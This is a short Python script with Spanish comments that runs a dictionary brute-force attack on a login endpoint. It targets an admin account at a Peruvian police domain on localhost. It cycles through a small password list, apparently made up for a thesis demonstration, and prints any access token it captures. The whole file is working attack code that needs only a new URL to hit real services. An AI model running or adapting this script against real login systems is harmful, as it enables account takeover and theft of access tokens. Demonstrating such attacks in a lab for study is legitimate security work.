import requests
import time

# Objetivo del ataque
TARGET_URL = "http://localhost:8000/auth/login"
TARGET_EMAIL = "admin@pnp.gob.pe"

# Diccionario de contraseñas comunes de la PNP (Simulado)
PASSWORD_DICTIONARY = [
    "123456",
    "admin123",
    "pnp2024",
    "password",
    "seguridad123",
    "director",
    "lima2026",
    "TesisUTP2026*" # <--- La contraseña real está escondida aquí
]

def lanzar_ataque():
    print(f"=== INICIANDO ATAQUE DE FUERZA BRUTA (OWASP T1110) ===")
    print(f"Objetivo: {TARGET_EMAIL}")
    print(f"Cargando diccionario de {len(PASSWORD_DICTIONARY)} contraseñas...\n")
    
    inicio_ataque = time.time()
    
    for intento, password in enumerate(PASSWORD_DICTIONARY, 1):
        payload = {"email": TARGET_EMAIL, "password": password}
        
        # Disparamos la petición HTTP
        res = requests.post(TARGET_URL, json=payload)
        
        # Analizamos la respuesta del servidor policial
        if res.status_code == 200:
            print(f"\n[!!!] BRECHA DE SEGURIDAD DETECTADA [!!!]")
            print(f"[+] Contraseña comprometida en el intento {intento}: '{password}'")
            print(f"[+] Token extraído: {res.json().get('access_token')[:20]}...")
            break
        elif res.status_code == 401:
            print(f"[-] Intento {intento} fallido. Clave '{password}' rechazada (HTTP 401).")
        else:
            print(f"[?] Respuesta inusual en intento {intento} (HTTP {res.status_code})")
            
        # Pequeña pausa para no saturar nuestro propio servidor local
        time.sleep(0.2)
        
    print(f"\n=== REPORTE DE ATAQUE FINALIZADO ===")
    print(f"Tiempo total: {round(time.time() - inicio_ataque, 2)} segundos.")

if __name__ == "__main__":
    lanzar_ataque()